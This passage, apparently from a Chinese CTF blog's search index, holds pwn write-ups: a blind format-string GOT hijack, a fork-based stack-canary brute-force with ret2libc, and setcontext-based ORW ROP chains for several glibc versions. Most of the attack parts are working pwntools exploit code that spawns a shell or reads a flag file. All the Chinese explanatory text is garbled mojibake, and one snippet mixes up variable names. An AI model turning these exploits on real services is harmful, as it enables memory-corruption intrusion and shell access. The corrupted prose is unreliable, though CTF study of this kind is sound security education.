æˆæˆªæ–­ã€‚\n\n(3)dumpçš„å†…å®¹åªéœ€è¦æœ‰0x1000è¿™ä¹ˆå¤§å°±è¡Œï¼Œä¸€ä¸ªå†…å­˜é¡µå³å¯ã€‚\n\n(4)æ²¡æœ‰å¼€å¯PIEæ—¶ï¼Œ32ä½ç¨‹åºä»0x8048000å¼€å§‹ã€‚\n\nâ–²æ­å»ºé¢˜ç›®æ—¶ï¼Œdumpå‡ºæ¥çš„å†…å®¹å¯èƒ½ä¼šæœ‰ç‚¹æ”¹å˜ï¼Œæ²¡åŠæ³•gdbè°ƒè¯•ï¼Œåº”è¯¥æ˜¯libcç‰ˆæœ¬æˆ–è€…ASLRçš„é—®é¢˜ï¼Œä¸è¿‡ä¸å½±å“ï¼ŒIDAé™æ€åˆ†æå°±å¥½ã€‚\n\n5.ä¹‹åå°±æ˜¯å¸¸è§„çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åˆ©ç”¨äº†ï¼Œå€ŸåŠ©dumpä¸‹æ¥çš„æ–‡ä»¶ï¼Œæ‰¾åˆ°printfçš„gotè¡¨åœ°å€ï¼Œåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ‰“å°printfå‡½æ•°çœŸå®åœ°å€ã€‚ä¹‹åé€šè¿‡DynELFæˆ–è€…LibcSearchæ¥è·å–systemå‡½æ•°åœ¨libcä¸­çš„åç§»ï¼Œåˆ©ç”¨æ³„éœ²çš„printfå‡½æ•°çœŸå®åœ°å€ï¼Œå¾—åˆ°LibcåŠ è½½çš„åŸºåœ°å€ï¼Œå†è®¡ç®—å¾—åˆ°systemå‡½æ•°çš„çœŸå®åœ°å€ã€‚æœ€åå†åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°†systemå‡½æ•°çœŸå®åœ°å€å†™åˆ°printfçš„gotè¡¨å¤„ï¼ŒåŠ«æŒgotè¡¨ã€‚æœ€åå†è¾“å…¥binshå­—ç¬¦ä¸²å³å¯åŠ«æŒprintf(\"/bin/sh\")ä¸ºsystem(\"/bin/sh\")ã€‚\n\n(1)æ³„éœ²printfå‡½æ•°çœŸå®åœ°å€:\n\n```\n#æ³¨é‡Šå¤´\n\ndef get_printf_addr():\n    io = remote('127.0.0.1', '10001')\n    io.recvline()\n    payload = \"%9$s.AAA\" + p32(printf_got)\n    io.sendline(payload)\n    data = p.recvuntil(\".AAA\")[:4]\n    log.info(\"printf address: %s\" % data.encode('hex'))\n    return data\nprintf_addr = get_printf_addr()\n```\n\n(2)è®¡ç®—æˆ–è€…DynELFå¾—åˆ°systemå‡½æ•°çœŸå®åœ°å€system_addrã€‚\n\n(3)åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è¿›è¡Œattack\n\n```\npayload = fmtstr_payload(7, {printf_got:system_addr})\nio = remote('127.0.0.1', '10001')\nio.recvline()\nio.sendline(payload)\nio.recv()\nio.sendline('/bin/sh')\nio.interactive()\n```\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://www.dazhuanlan.com/2019/10/08/5d9c20226a067/\n\n \n","tags":["Blind"],"categories":["PWN","BlindFmstr"]},{"title":"NSCTF 2017-pwn2","url":"/2021/08/19/NSCTF 2017-pwn2/","content":"\n1.å¸¸è§„checksecï¼Œå¼€å¯äº†NXå’Œcanaryï¼ŒIDAæ‰“å¼€æ‰¾æ¼æ´ï¼Œsub_80487FA()å‡½æ•°ä¸­å­˜åœ¨ä¸¤ä¸ªæ¼æ´ï¼š\n\n(1)æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ns = (char *)malloc(0x40u);\nsub_804876D(&buf);\nsprintf(s, \"[*] Welcome to the game %s\", &buf);\nprintf(s)\n```\n\n(2)æ ˆæº¢å‡ºæ¼æ´ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nread(0, &buf, 0x100u);\n```\n\n2.ç”±äºcanaryçš„å…³ç³»ï¼Œæ ˆæº¢å‡ºæ²¡åŠæ³•åˆ©ç”¨ï¼Œä½†æ˜¯è¿™é‡Œå¯ä»¥é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ç›´æ¥æ³„éœ²canaryï¼Œä¹‹åå†å®é™…æ“ä½œã€‚è¿™é‡Œä¸ºäº†å­¦ä¹ çˆ†ç ´canaryçš„æ–¹å¼ï¼Œå…ˆç”¨çˆ†ç ´çš„æ–¹å¼æ¥è·å–canaryã€‚\n\n3.å¦‚æœç›´æ¥çˆ†ç ´canaryï¼Œç”±äºcanaryéšæœºåˆ·æ–°ï¼Œå°±ç®—å»æ‰æœ€åä¸€ä¸ªå­—èŠ‚\\x00ï¼Œåœ¨32ä½æ¡ä»¶ä¸‹æˆ‘ä»¬å‡å®šä¸€ä¸ªcanaryçš„å€¼ï¼Œé‚£ä¹ˆcanaryéšæœºç”Ÿæˆä¸ºæˆ‘ä»¬å‡å®šçš„å€¼çš„æ¦‚ç‡åº”è¯¥ä¸º1/(2^24-1)æ‰€ä»¥ä»æ¦‚ç‡ä¸Šè®²åº”è¯¥éœ€è¦çˆ†ç ´2^24-1æ¬¡ï¼Œä¹Ÿå°±æ˜¯16,777,215-1æ¬¡ï¼Œè€Œä¸”è¿˜åªæ˜¯æ¦‚ç‡ä¸Šçš„æœŸæœ›å€¼ï¼Œå¦‚æœä¸è€ƒè™‘canaryçš„å®é™…ç”Ÿæˆæœºåˆ¶ï¼Œå¹¶ä¸”è¿æ°”ä¸å¥½çš„è¯ï¼Œå¯èƒ½æ— ç©·å¤§ï¼Œç­‰çˆ†å‡ºæ¥é»„èŠ±èœéƒ½å‡‰äº†ï¼Œè¿™é¬¼èƒ½æ¥å—ã€‚æ‰€ä»¥ä¸€èˆ¬ä½¿ç”¨çˆ†ç ´canaryéƒ½éœ€è¦ä¸€ä¸ªforkå­è¿›ç¨‹ã€‚\n\n4.å­è¿›ç¨‹çš„å´©æºƒå¹¶ä¸ä¼šå½±å“åˆ°çˆ¶è¿›ç¨‹ï¼Œå¹¶ä¸”ç”±äºå­è¿›ç¨‹çš„æ•°æ®éƒ½æ˜¯ä»çˆ¶è¿›ç¨‹å¤åˆ¶è¿‡æ¥çš„ï¼Œcanaryä¹Ÿä¸€æ ·ï¼Œåªè¦çˆ¶è¿›ç¨‹ä¸ç»“æŸï¼Œå­è¿›ç¨‹æ— è®ºå´©æºƒå¤šå°‘æ¬¡å…¶åˆå§‹åŒ–çš„æ•°æ®è¿˜æ˜¯çˆ¶è¿›ç¨‹çš„æ•°æ®ï¼Œcanaryå°±ä¸ä¼šå‘ç”Ÿæ”¹å˜ï¼Œè¿™æ ·å°±ä¸ºå¿«é€Ÿçˆ†ç ´canaryåˆ›é€ äº†å‰æã€‚åˆšå¥½è¿™ä¸ªç¨‹åºæœ‰forkä¸€ä¸ªå­è¿›ç¨‹ï¼š\n\n(1)è§‚å¯Ÿæ±‡ç¼–ä»£ç ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191522904.png)\n\nmainå‡½æ•°ä¸»ä½“ä¸­å…ˆcall forkï¼Œç”±äºå‡½æ•°çš„ç»“æœåŸºæœ¬éƒ½æ˜¯ä¼ ç»™eaxï¼Œæ‰€ä»¥è¿™é‡Œçš„eaxå°±ä»£è¡¨forkçš„æˆåŠŸä¸å¦ï¼Œè¿”å›IDä»£è¡¨forkæˆåŠŸï¼Œç„¶åå°†è°ƒç”¨ç»“æœèµ‹å€¼ç»™å±€éƒ¨å˜é‡[esp+1ch]ï¼Œä¹‹åæ‹¿0ä¸å±€éƒ¨å˜é‡[esp+1ch]æ¯”è¾ƒã€‚è¿™é‡Œæ¶‰åŠåˆ°JNZå½±å“çš„æ ‡å¿—ä½ZFï¼ŒCFç­‰ï¼Œä¸ç»†ä»‹ç»ã€‚æ€»è€Œè¨€ä¹‹å°±æ˜¯ä¼šforkä¸€ä¸ªå­è¿›ç¨‹ï¼ŒæˆåŠŸå°±è·³è½¬åˆ°æˆ‘ä»¬ä¹‹å‰è¯´è¿‡çš„æœ‰æ¼æ´çš„å‡½æ•°ä¸­ï¼Œå¤±è´¥åˆ™ç­‰å¾…ï¼Œä¸€ä¼šç„¶åä¾æ®whileé‡å¼€ç¨‹åºã€‚\n\n(2)è§‚å¯Ÿä¼ªä»£ç ä¹Ÿå¯ä»¥\n\nâ–²forkæœºåˆ¶ï¼š\n\n1ï¼‰åœ¨çˆ¶è¿›ç¨‹ä¸­ï¼Œforkè¿”å›æ–°åˆ›å»ºå­è¿›ç¨‹çš„è¿›ç¨‹IDï¼›\n\n2ï¼‰åœ¨å­è¿›ç¨‹ä¸­ï¼Œforkè¿”å›0ï¼›\n\n3ï¼‰å¦‚æœå‡ºç°é”™è¯¯ï¼Œforkè¿”å›ä¸€ä¸ªè´Ÿå€¼ï¼›\n\n5.çˆ†ç ´canaryåŸç†ï¼š\n\n(1)æœ€å¼€å§‹æˆ‘è®¤ä¸ºå°±ç®—canaryä¸å˜ï¼Œé‚£ä¹ˆä»0*24å¼€å§‹å°è¯•ï¼Œä¸€ç›´åˆ°canaryçš„å€¼ï¼Œé‚£ä¹ˆéœ€è¦å°è¯•canaryå€¼è¿™ä¹ˆå¤šæ¬¡ï¼Œæœ€å°‘1æ¬¡ï¼Œæœ€å¤š2^24æ¬¡ï¼Œå°±ç®—å–æœŸæœ›ï¼Œé‚£ä¹Ÿåº”è¯¥æ˜¯(1/2)*(2^24)æ¬¡ã€‚ä¹Ÿæ²¡åŠæ³•æ¥å—å•Šã€‚\n\n(2)ä¹‹åçœ‹äº†canaryçš„æ£€æŸ¥æœºåˆ¶å’Œç”Ÿæˆæœºåˆ¶ï¼šåœ¨sub_80487FAæ±‡ç¼–ä»£ç ä¸­ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191522748.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191522426.png)\n\nç”Ÿæˆçš„æ—¶å€™æ˜¯å°†æ ˆä¸ŠæŒ‡å®šåœ°æ–¹[ebp+var_C]ç»™ä¿®æ”¹æˆcanaryã€‚\n\næ£€æŸ¥çš„æ—¶å€™ï¼Œæ˜¯ä»æ ˆä¸Šå–[ebp+var_C]çš„å€¼ä¼ ç»™eaxå’Œæœ€å¼€å§‹éšæœºç”Ÿæˆçš„canary(large gs:14h)æ¥æ¯”è¾ƒï¼Œæ‰€ä»¥å½“æˆ‘ä»¬ç”¨æ ˆæº¢å‡ºçš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥åªæº¢å‡ºä¸€ä¸ªå­—èŠ‚æ¥ä¿®æ”¹[ebp+var_C]çš„ç¬¬1ä¸ªå­—èŠ‚ï¼Œ(ç¬¬0ä¸ªå­—èŠ‚æ˜¯\\x00)ï¼Œç„¶åå¯åŠ¨æ£€æŸ¥æœºåˆ¶ã€‚ç”±äºåªä¿®æ”¹äº†æ ˆä¸Š[ebp+var_C]çš„ç¬¬1ä¸ªå­—èŠ‚æ•°æ®ï¼Œç¬¬3,2ä¸ªå­—èŠ‚ä»ç„¶è¿˜æ˜¯ä¹‹å‰è¢«ä¿å­˜çš„canaryçš„å€¼ã€‚æ‰€ä»¥æˆ‘ä»¬è·å–ç¬¬1ä¸ªå­—èŠ‚éœ€è¦å°è¯•æœ€å°‘1æ¬¡ï¼Œæœ€å¤š2^8æ¬¡ï¼Œå¹³å‡(1/2)*(2^8)æ¬¡ï¼Œä¹Ÿå°±æ˜¯128æ¬¡ï¼Œå¯ä»¥æ¥å—ã€‚ä¹‹åå°†çˆ†ç ´æˆåŠŸçš„ç¬¬1ä¸ªå­—èŠ‚åŠ åˆ°æ ˆæº¢å‡ºå†…å®¹ä¸­ï¼Œå†æº¢å‡ºä¸€ä¸ªå­—èŠ‚ä¿®æ”¹[ebp+var_C]ä¸Šçš„ç¬¬2ä¸ªå­—èŠ‚ï¼ŒåŒç†ï¼Œå®Œæˆçˆ†ç ´éœ€è¦128æ¬¡ï¼Œæ€»çš„æ¥è¯´å¹³å‡éœ€è¦128*3=384æ¬¡ï¼Œå®Œå…¨å¯ä»¥æ¥å—ã€‚\n\n(3)çˆ†ç ´ä¸€èˆ¬å½¢å¼ç¨‹åºï¼Œä¸¤ä¸ªå¾ªç¯ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nfor i in xrange(3):\nfor j in xrange(256):\n```\n\n6.ä¹‹åä¸åŒç¨‹åºä¸å¤ªä¸€æ ·ï¼Œæœ‰çš„ç¨‹åºæ²¡æœ‰å¾ªç¯ï¼Œæ˜¯ç›´æ¥forkä¸€ä¸ªå­è¿›ç¨‹ï¼Œç›‘å¬å…¶å®ƒç«¯å£ï¼Œè¿™æ—¶å€™åªè¦è¿æ¥è¯¥ç«¯å£å°±å¯ä»¥è¿›è¡Œçˆ†ç ´ï¼Œå¤±è´¥äº†å…³é—­ç«¯å£å°±æ˜¯ã€‚\n\næœ‰çš„ç¨‹åºåªæ˜¯åœ¨ç¨‹åºä¸­forkä¸€ä¸ªå­è¿›ç¨‹ï¼Œä½†æ˜¯æœ‰å¾ªç¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦åœ¨å¾ªç¯é‡Œè·‘å‡ºæ¥canaryã€‚ç„¶åç›´æ¥è¿›è¡Œä¸‹ä¸€æ­¥payloadï¼Œä¸ç„¶æ–­å¼€è¿æ¥çš„è¯ï¼Œç¨‹åºåˆé‡æ–°ç”Ÿæˆcanaryï¼Œç­‰äºæ²¡ç”¨ã€‚\n\n7.æ€»ç»“ä¸€ä¸‹ï¼Œç¨‹åºæœ€å¼€å§‹éœ€è¦è¾“å…¥Yï¼Œç„¶åè·³è½¬åˆ°æœ‰æ¼æ´çš„å‡½æ•°sub_80487FAä¸­ï¼Œä¹‹åå¯ä»¥è·å–è¾“å…¥nameï¼Œè¿™é‡Œçš„è¾“å…¥çš„nameåœ¨ä¸‹ä¸€æ¡[*] Welcome to the gameä¹‹åä¼šè¢«æ‰“å°å‡ºæ¥ï¼Œå¹¶ä¸”æ‰“å°çš„æ–¹å¼å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚æ‰€ä»¥å¯ä»¥é€šè¿‡è°ƒè¯•ï¼Œè¾“å…¥%pæ¥è·å–æ ˆä¸Šçš„æŒ‡å®šçš„libcåœ°å€å†…å®¹ï¼Œæ³„éœ²libcä»è€Œè·å–libcåŸºåœ°å€ã€‚\n\n8.ç”±äºæ¯æ¬¡å­ç¨‹åºå´©æºƒåéƒ½ä¼šä»å¤´å¼€å§‹ï¼Œéƒ½éœ€è¦å†è¾“å…¥Yå’Œnameï¼Œé‚£ä¹ˆç›´æ¥å°†è¯¥æ®µæ³„éœ²ä»£ç æ”¾åœ¨çˆ†ç ´å¾ªç¯ä¸­å³å¯ï¼š\n\n```\ncanary = '\\x00'\nfor i in xrange(3):\n    for j in xrange(256):\n        io.sendline('Y')\n        io.recv()\n        io.sendline('%19$p') #æ³„éœ²æ ˆä¸Šçš„libcåœ°å€\n        io.recvuntil('game ')\n        leak_libc_addr = int(io.recv(10), 16)\n\n        io.recv()\n        payload = 'A'*16 #æ„é€ payloadçˆ†ç ´canary\n        payload += canary\n        payload += chr(j)\n        io.send(payload)\n        io.recv()\n        if (\"\" != io.recv(timeout = 0.1)): \n        #å¦‚æœcanaryçš„å­—èŠ‚ä½çˆ†ç ´æ­£ç¡®ï¼Œåº”è¯¥è¾“å‡ºä¸¤ä¸ª\"[*] Do you love me?\"ï¼Œå› æ­¤é€šè¿‡ç¬¬äºŒä¸ªrecvçš„ç»“æœåˆ¤æ–­æ˜¯å¦æˆåŠŸ\n            canary += chr(j)\n            log.info('At round %d find canary byte %#x' %(i, j))\n            break\n```\n\n \n\n9.çˆ†ç ´ç»“æŸåï¼Œå¾—åˆ°libcåŸºåœ°å€ï¼Œcanaryï¼Œä»¥åŠä¸€ä¸ªå¯ä»¥åˆ©ç”¨çš„æ ˆæº¢å‡ºï¼Œç¨‹åºå¾ªç¯ä»æœ€å¼€å§‹ã€‚é‚£ä¹ˆåˆ©ç”¨æ ˆæº¢å‡ºè¿”å›åˆ°systemå‡½æ•°ï¼Œç”±äº32ä½ç¨‹åºï¼Œæ ˆä¼ å‚ï¼Œé‚£ä¹ˆå¯ä»¥æå‰å¸ƒç½®å¥½æ ˆï¼Œä½¿å¾—systemå‡½æ•°ç›´æ¥ä»æˆ‘ä»¬å¸ƒç½®çš„æ ˆä¸Šè¯»å–binshå­—ç¬¦ä¸²ï¼Œç›´æ¥getshellã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nlog.info('Canary is %#x' %(u32(canary)))\nsystem_addr = leak_libc_addr - 0x2ed3b + 0x3b060\nbinsh_addr = leak_libc_addr - 0x2ed3b + 0x15fa0f\nlog.info('System_address:%#x,binsh_addr:%#x'%(system_addr,binsh_addr))\n\npayload = ''\npayload += 'A'*16\npayload += canary\npayload += 'B'*12\npayload += p32(system_addr)\npayload += 'CCCC'\npayload += p32(binsh_addr)\n\nio.sendline('Y') #[*] Do you love me?\nio.recv()\nio.sendline('1') #[*] Input Your name please: éšä¾¿ä¸€ä¸ªè¾“å…¥\nio.recv()\nio.send(payload) #[*] Input Your Id: æ¼æ´äº§ç”Ÿç‚¹\nio.interactive()\n```\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n\n","tags":["canary"],"categories":["PWN","canaryç»•è¿‡0x9"]},{"title":"ORWæ±‡æ€»","url":"/2021/08/19/ORWæ±‡æ€»/","content":"\n1.seccompä¿æŠ¤ï¼š\n\n(1)å·¥å…·å®‰è£…ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nsudo apt install gcc ruby-dev\ngem install seccomp-tools\n```\n\n(2)æŸ¥çœ‹ä¿æŠ¤ï¼š\n\nseccomp-tools dump ./pwn\n\n```\n#æ³¨é‡Šå¤´\n\nroot@241adce81c0a:/ctf/CISCN/silverwolf# seccomp-tools dump ./silverwolf\nline CODE JT JF K\n=================================\n0000: 0x20 0x00 0x00 0x00000004 A = arch\n0001: 0x15 0x00 0x07 0xc000003e if (A != ARCH_X86_64) goto 0009\n0002: 0x20 0x00 0x00 0x00000000 A = sys_number\n0003: 0x35 0x00 0x01 0x40000000 if (A < 0x40000000) goto 0005\n0004: 0x15 0x00 0x04 0xffffffff if (A != 0xffffffff) goto 0009\n0005: 0x15 0x02 0x00 0x00000000 if (A == read) goto 0008\n0006: 0x15 0x01 0x00 0x00000001 if (A == write) goto 0008\n0007: 0x15 0x00 0x01 0x00000002 if (A != open) goto 0009\n0008: 0x06 0x00 0x00 0x7fff0000 return ALLOW\n0009: 0x06 0x00 0x00 0x00000000 return KILL\n```\n\n(3)è§£æï¼š\n\nå¦‚ä¸Šï¼Œå¦‚æœæ¶æ„ä¸ä¸ºARCH_X86_64ï¼Œåˆ™to 0009(kill)ã€‚ç³»ç»Ÿè°ƒç”¨å·Aä¸ºread,writeï¼Œåˆ™to 0008ï¼Œå³ALLOWã€‚åŒç†çœ‹æ‡‚ifè¯­å¥å°±è¡Œï¼Œè¿™é‡Œåªèƒ½ç”¨readå’Œwriteï¼Œç…§ç†è¯´openä¹Ÿå¯ä»¥ï¼Œä½†æ˜¯è¿™é‡Œå¥½åƒä¸å¤ªè¡Œã€‚\n\n2.setcontextä¸åŒç‰ˆæœ¬ï¼š\n\n(1)2.29ä»¥å‰ï¼šåŠ«æŒ free_hook æˆ–è€… malloc_hookå†™å…¥ setcontextå‡½æ•°ä¸­çš„ gadget( setcontext+53)ï¼Œé€šè¿‡ rdiç´¢å¼•ï¼Œæ¥è®¾ç½®ç›¸å…³å¯„å­˜å™¨ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n<setcontext+53>: mov rsp,QWORD PTR [rdi+0xa0]\n<setcontext+60>: mov rbx,QWORD PTR [rdi+0x80]\n<setcontext+67>: mov rbp,QWORD PTR [rdi+0x78]\n<setcontext+71>: mov r12,QWORD PTR [rdi+0x48]\n<setcontext+75>: mov r13,QWORD PTR [rdi+0x50]\n<setcontext+79>: mov r14,QWORD PTR [rdi+0x58]\n<setcontext+83>: mov r15,QWORD PTR [rdi+0x60]\n<setcontext+87>: mov rcx,QWORD PTR [rdi+0xa8]\n<setcontext+94>: push rcx\n<setcontext+95>: mov rsi,QWORD PTR [rdi+0x70]\n<setcontext+99>: mov rdx,QWORD PTR [rdi+0x88]\n<setcontext+106>: mov rcx,QWORD PTR [rdi+0x98]\n<setcontext+113>: mov r8,QWORD PTR [rdi+0x28]\n<setcontext+117>: mov r9,QWORD PTR [rdi+0x30]\n<setcontext+121>: mov rdi,QWORD PTR [rdi+0x68]\n<setcontext+125>: xor eax,eax\n<setcontext+127>: ret\n```\n\nå¹¶æ‰§è¡Œæå‰å¸ƒç½®å¥½çš„ ORW ROP chainsã€‚\n\nâ–³å¦‚æœæ˜¯free_hookåˆ™å°†å¯¹åº”è¦é‡Šæ”¾çš„å †å—çš„å†…å®¹æ”¹ä¸ºORW ROP chainså³å¯ã€‚å¦‚æœæ˜¯malloc_hookï¼Œä¸å¤ªçŸ¥é“ï¼Œåº”è¯¥ä¹Ÿæ˜¯åœ¨å¯¹åº”å †å—æ”¹ORW ROP chainsï¼Œä½†æ˜¯éœ€è¦è¿™ä¸ªå †å—ç¡®å®æ˜¯è¿™ä¸€æ¬¡mallocå‡ºæ¥çš„å †å—å§ã€‚\n\n(2)2.29å setcontextä¸­çš„gadgetå˜æˆäº†ä»¥ rdxç´¢å¼•ï¼Œå› æ­¤å¦‚æœæˆ‘ä»¬æŒ‰ç…§ä¹‹å‰æ€è·¯çš„è¯ï¼Œéœ€è¦é€šè¿‡ ROPæ§åˆ¶ RDXçš„å€¼ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n.text:00000000000580DD mov rsp, [rdx+0A0h]\n.text:00000000000580E4 mov rbx, [rdx+80h]\n.text:00000000000580EB mov rbp, [rdx+78h]\n.text:00000000000580EF mov r12, [rdx+48h]\n.text:00000000000580F3 mov r13, [rdx+50h]\n.text:00000000000580F7 mov r14, [rdx+58h]\n.text:00000000000580FB mov r15, [rdx+60h]\n.text:00000000000580FF test dword ptr fs:48h, 2\n....\n.text:00000000000581C6 mov rcx, [rdx+0A8h]\n.text:00000000000581CD push rcx\n.text:00000000000581CE mov rsi, [rdx+70h]\n.text:00000000000581D2 mov rdi, [rdx+68h]\n.text:00000000000581D6 mov rcx, [rdx+98h]\n.text:00000000000581DD mov r8, [rdx+28h]\n.text:00000000000581E1 mov r9, [rdx+30h]\n.text:00000000000581E5 mov rdx, [rdx+88h]\n.text:00000000000581EC xor eax, eax\n.text:00000000000581EE retn\n```\n\nè¿™é‡Œå¥½åƒèµ‹å€¼çš„ç´¢å¼•å¥½åƒæœ‰ç‚¹å˜åŒ–ï¼Œæ‰€ä»¥å¯èƒ½å®é™…åšé¢˜çš„æ—¶å€™éœ€è¦å˜ä¸€ä¸‹è„šæœ¬ã€‚åŒæ—¶setcontext+53å˜æˆäº†setcontext+61ç„¶åç”±äºrdxçš„gadgetå¯èƒ½ä¸æ˜¯å¤ªå¥½æ‰¾ï¼Œæ‰€ä»¥ä¸€èˆ¬æœ‰ä»¥ä¸‹å‡ ä¸ªå¥½ç”¨çš„gadgetï¼š\n\nâ‘ getkeyserv_handle+576ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nmov rdx, [rdi+8]\nmov [rsp+0C8h+var_C8], rax\ncall qword ptr [rdx+20h]\n```\n\né€šè¿‡rdiæ§åˆ¶rdxï¼ŒåŒæ ·2.29ä»¥åä¸åŒç‰ˆæœ¬éƒ½ä¸å¤ªä¸€æ ·ï¼Œéœ€è¦å†è°ƒè¯•çœ‹çœ‹ï¼Œæ¯”å¦‚2.31é‡Œå°±æ˜¯ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nmov rdx,QWORD PTR [rdi+0x8]\nmov QWORD PTR [rsp],rax\ncall QWORD PTR [rdx+0x20]\n```\n\nâ‘¡svcudp_reply+26:\n\n```\n#æ³¨é‡Šå¤´\n\nmov rbp, qword ptr [rdi + 0x48]; \nmov rax, qword ptr [rbp + 0x18]; \nlea r13, [rbp + 0x10]; \nmov dword ptr [rbp + 0x10], 0; \nmov rdi, r13; \ncall qword ptr [rax + 0x28];\n```\n\né€šè¿‡rdiæ§åˆ¶rbpå®ç°æ ˆè¿ç§»ï¼Œç„¶åå³å¯ä»»æ„gadgetäº†ã€‚\n\nå…¶ä¸­2.31ç‰ˆæœ¬ä¸‹è¿˜æ˜¯ä¸€æ ·çš„ï¼Œå¦‚ä¸‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nmov rbp,QWORD PTR [rdi+0x48]\nmov rax,QWORD PTR [rbp+0x18]\nlea r13,[rbp+0x10]\nmov DWORD PTR [rbp+0x10],0x0\nmov rdi,r13\ncall QWORD PTR [rax+0x28]\n```\n\nâ‘¢ä¸‡èƒ½gadgetï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆhttps://www.anquanke.com/post/id/236832#h3-10è¿™ç¯‡æ–‡ç« æ²¡æœ‰æåŠåˆ°ä¸‡èƒ½gadgetï¼Œä¸è¿‡æˆ‘è§‰å¾—åº”è¯¥ä¹Ÿèƒ½ç”¨ï¼Œä¸è¿‡ä½¿ç”¨ä¸‡èƒ½gadgetçš„è¯ä¸€èˆ¬è¿˜éœ€è¦é…åˆæ ˆè¿ç§»æ‰è¡Œã€‚\n\nâ‘£é€šè¿‡environæ³„éœ²æ ˆåœ°å€ï¼Œå¹¶åœ¨æ ˆä¸Šæ„é€ orw ropé“¾ã€‚(libcçš„bssåç§»ï¼Œç„¶åio_file)\n\n \n\n3.å¸¸ç”¨orw chainsè„šæœ¬ï¼š\n\n(1)åˆ©ç”¨openã€writeã€readï¼š\n\nCISCN-2021 silverwolf\n\n```\n#æ³¨é‡Šå¤´\n\n#ç›´æ¥æ”¹__free_hookä¸ºsetcontext+53\n#2.28 and down\n\nchunk_addr = heap_addr +0x2e0\nfake_rsp = chunk_addr + 0xb0 + 0x10\nflag = chunk_addr + 0xb0\n\norw = \"a\"*0xa0\n\norw += p64(fake_rsp)+p64(ret)\norw += './flag\\x00\\x00'\norw += p64(0)\norw += p64(pop_rdi_ret) + p64(flag)\norw += p64(pop_rsi_ret) + p64(0)\norw += p64(pop_rax_ret) + p64(2)\norw += p64(syscall_ret)\norw += p64(pop_rdi_ret) + p64(3)\norw += p64(pop_rsi_ret) + p64(fake_rsp+0x200)\norw += p64(pop_rdx_ret) + p64(0x30)\norw += p64(libc_base+libc.sym['read'])\norw += p64(pop_rdi_ret) + p64(1)\norw += p64(libc_base+libc.sym['write'])\n```\n\n2019-BALSN-CTF-plaintext\n\n```\n#æ³¨é‡Šå¤´\n\n#2.29,éœ€è¦å°†__free_hookè®¾ç½®ä¸ºæŒ‡å®šgadgetï¼Œè¿™é‡Œä¸º__libc_cleanup_routine+7\nmov rdx, qword ptr [rdi + 8]\nmov rax, qword ptr [rdi]\nmov rdi, rdx\njmp rax\n#ä¸åŒgadgetè„šæœ¬éœ€è¦å¾®è°ƒï¼Œåªè¦æ»¡è¶³èµ‹å€¼rdiå¹¶ä¸”ä¹‹åè·³è½¬åˆ°setcontextå³å¯\n#éœ€è¦ä»\"a\"*0xa0ä¸­æ‹¿å‡º0x10çš„ç©ºé—´ç”¨æ¥è®¾ç½®setcontext,ç„¶åå°†rdxèµ‹å€¼ä¸ºå¯¹åº”chunkåœ°å€\n\nchunk_addr = heap_addr +0x30a0\nfake_rsp = chunk_addr + 0xb0 + 0x10\nflag = chunk_addr + 0xb0\n\n#è¿™é‡Œsetcontext+0x1dæˆ–53éƒ½å¯ä»¥ï¼Œå…·ä½“è°ƒè¯•åˆ†æ,ä½†æ˜¯61ä¸è¡Œ\n#å³chunk_addr+0x8èµ‹å€¼ä¸ºchunk_addrï¼Œchunk_addrèµ‹å€¼ä¸ºsetcontext+0x1d\norw = p64(libc_addr + libc.symbols['setcontext'] + 0x1d) + p64(chunk_addr) \norw += \"a\"*0x90\n\norw += p64(fake_rsp) + p64(ret)\norw += './flag\\x00\\x00'\norw += p64(0)\norw += p64(pop_rdi_ret) + p64(flag)\norw += p64(pop_rsi_ret) + p64(0)\norw += p64(pop_rax_ret) + p64(2)\norw += p64(syscall_ret)\norw += p64(pop_rdi_ret) + p64(3)\norw += p64(pop_rsi_ret) + p64(fake_rsp+0x200)\norw += p64(pop_rdx_ret) + p64(0x30)\norw += p64(libc_base+libc.sym['read'])\norw += p64(pop_rdi_ret) + p64(1)\norw += p64(libc_base+libc.sym['write'])\n```\n\nYCB easy_heap\n\n```\n#æ³¨é‡Šå¤´ \n#2.31 \n#è¿™é‡ŒåŒæ ·å°†free_hookè®¾ç½®ä¸ºgadgetï¼Œç”¨åˆ°çš„æ˜¯getkeyserv_handle+576ï¼š \nmov rdx, [rdi+8] \nmov [rsp+0C8h+var_C8], rax \ncall qword ptr [rdx+20h] \n\n#chunk_addr+8èµ‹å€¼ä¸ºchunk_addrï¼Œchunk_addr+0x20èµ‹å€¼ä¸ºsetcontext+61\nchunk_addr = heap_addr +0x20\nfake_rsp = chunk_addr + 0xb0 + 0x10\nflag = chunk_addr + 0xb0 \n\norw = \"a\"*0x08 + p64(chunk_addr) \norw += \"a\"*0x10 \norw += p64(libc_addr + libc.sym['setcontext'] + 61) + \"a\"*0x8\norw += \"a\"*0x70\n\norw += p64(fake_rsp) + 